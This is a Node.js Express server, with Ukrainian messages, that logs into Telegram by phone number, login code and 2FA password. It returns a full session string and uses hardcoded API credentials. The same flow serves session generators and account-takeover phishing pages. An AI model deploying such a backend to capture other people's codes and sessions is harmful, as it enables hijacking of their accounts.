const express = require('express');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { Api } = require('telegram');

const app = express();
app.use(express.json());
app.use(express.static('public'));

const API_ID = 2040;
const API_HASH = 'b18441a1ff607e10a989891a5462e627';

const sessions = {};

app.post('/send-code', async (req, res) => {
    const { phone } = req.body;

    if (!phone) {
        return res.json({ success: false, error: 'Номер телефону не вказано' });
    }

    try {
        console.log(`[${phone}] Підключаємось до Telegram...`);

        const session = new StringSession('');
        const client = new TelegramClient(session, API_ID, API_HASH, {
            connectionRetries: 5,
        });

        await client.connect();

        const result = await client.sendCode(
            { apiId: API_ID, apiHash: API_HASH },
            phone
        );

        sessions[phone] = {
            client,
            phoneCodeHash: result.phoneCodeHash,
        };

        console.log(`[${phone}] Код надіслано`);
        res.json({ success: true });

    } catch (error) {
        console.error(`[${phone}] Помилка send-code:`, error.message);
        res.json({ success: false, error: error.message });
    }
});

app.post('/verify-code', async (req, res) => {
    const { phone, code } = req.body;

    if (!phone || !code) {
        return res.json({ success: false, error: 'Вкажіть телефон і код' });
    }

    const sessionData = sessions[phone];
    if (!sessionData) {
        return res.json({ success: false, error: 'Спочатку надішліть код' });
    }

    const { client, phoneCodeHash } = sessionData;

    try {
        console.log(`[${phone}] Перевіряємо код...`);

        await client.invoke(new Api.auth.SignIn({
            phoneNumber: phone,
            phoneCodeHash: phoneCodeHash,
            phoneCode: code.toString(),
        }));

        const savedSession = client.session.save();
        console.log(`[${phone}] Авторизація успішна`);

        delete sessions[phone];

        res.json({ success: true, session: savedSession });

    } catch (error) {
        console.error(`[${phone}] Помилка verify-code:`, error.message);

        if (error.message.includes('SESSION_PASSWORD_NEEDED')) {
            return res.json({ success: false, error: 'SESSION_PASSWORD_NEEDED' });
        }

        res.json({ success: false, error: error.message });
    }
});

app.post('/verify-password', async (req, res) => {
    const { phone, password } = req.body;

    if (!phone || !password) {
        return res.json({ success: false, error: 'Вкажіть телефон і пароль' });
    }

    const sessionData = sessions[phone];
    if (!sessionData) {
        return res.json({ success: false, error: 'Сесія не знайдена' });
    }

    const { client } = sessionData;

    try {
        console.log(`[${phone}] Перевіряємо 2FA пароль...`);

        await client.signInWithPassword(
            { apiId: API_ID, apiHash: API_HASH },
            { password: () => Promise.resolve(password) }
        );

        const savedSession = client.session.save();
        console.log(`[${phone}] 2FA авторизація успішна`);

        delete sessions[phone];

        res.json({ success: true, session: savedSession });

    } catch (error) {
        console.error(`[${phone}] Помилка verify-password:`, error.message);
        res.json({ success: false, error: error.message });
    }
});

app.listen(3000, () => {
    console.log('Сервер запущено на http://localhost:3000');
});